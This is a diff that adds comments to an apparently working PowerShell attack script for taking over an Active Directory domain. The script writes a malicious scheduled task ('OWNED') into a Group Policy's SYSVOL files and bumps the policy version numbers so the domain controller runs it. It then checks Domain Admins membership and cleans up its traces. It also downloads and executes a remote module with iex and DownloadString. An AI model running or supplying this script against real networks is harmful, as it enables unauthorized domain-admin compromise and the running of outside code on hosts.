@@ -1,3 +1,4 @@
+# Enabling TLS and loading the ActiveDirectory module to memory #
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
 Import-ActiveDirectory
@@ -13,11 +14,13 @@ $guid2 = "{"+$guid+"}"
 $domain = (Get-ADDomain).Forest
 $domaindn = (Get-ADDomain).DistinguishedName
 $dc = (Get-ADDomain).InfrastructureMaster
+# Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
 if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
     $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
 } else {
     $noext=1
 }
+# Looking for an active domain admin account #
 $i = 0
 while($gotcha -ne "1"){
     $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
@@ -27,6 +30,7 @@ while($gotcha -ne "1"){
         $i++
     }
 }
+# Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
 if(cat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
     Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
     echo "[-] ScheduledTasks file in SYSVOL exists, created a backup file!"
@@ -36,6 +40,7 @@ if(cat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTas
     Copy-Item .\ScheduledTasks.xml "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
     echo "[+] Created ScheduledTasks file in SYSVOL!"
 }
+# Modifying the ScheduledTasks.xml with the gathered infromation #
 $pwd = (pwd | select Path -ExpandProperty Path)
 $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
 $encoding = 'ASCII'
@@ -58,6 +63,7 @@ echo "[+] Incrementing GPT.INI Version by 1"
 $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
 $encoding = 'ASCII'
 $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
+# Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
 foreach ($s in $gptIniContent) {
     if($s.StartsWith("Version")) {
         $num = ($s -split "=")[1]
@@ -71,6 +77,7 @@ $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaind
 echo "[+] Current GPO AD versionNumber = $currentVersion"
 echo "[+] Incrementing version by 1"
 $newVersionValue = $currentVersion+1
+# Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
 Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
 $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
 echo "[+] GPO AD versionNumber = $currentVersion"
@@ -79,6 +86,7 @@ if($noext -ne 1){
 } else {
     echo "[+] Current gPCMachineExtensionNames : <not set>"
 }
+# Modyfing the gPCMachineExtensionNames attribute of the policy # 
 echo "[+] Adding Extensions to the attribute"
 Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
 $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
@@ -89,6 +97,7 @@ if($FinalizedGPO.StartsWith("[{00000000")){
     exit(0)
 }
 echo "`n`n"
+# A bad loading screen counting up to 300(5 minute update interval on DCs) #
 for ($x = 1; $x -le 300; $x++ ){
     $PercentCompleted = ($x/300*100)
     Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
@@ -107,6 +116,7 @@ echo "`n`n"
 net group "domain admins" /dom
 echo "`n`n"
 echo "[+] Reverting extensions back to what they were"
+# Reverting the gPCMachineExtensionNames #
 if($noext -ne 1){
 Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
 } else {
@@ -119,12 +129,14 @@ echo "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
     echo "[+] Cleared gPCMachineExtensionNames!"
 }
 echo "[+] Removing the scheduled task from the DC"
+# Trying to delete the scheduled task from the DC #
 try{
     Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
 }
 catch{
     echo "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
 }
+# Reverting the ScheduledTasks.xml to the backup or deletes it #
 Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
 if(ls "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
     move \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
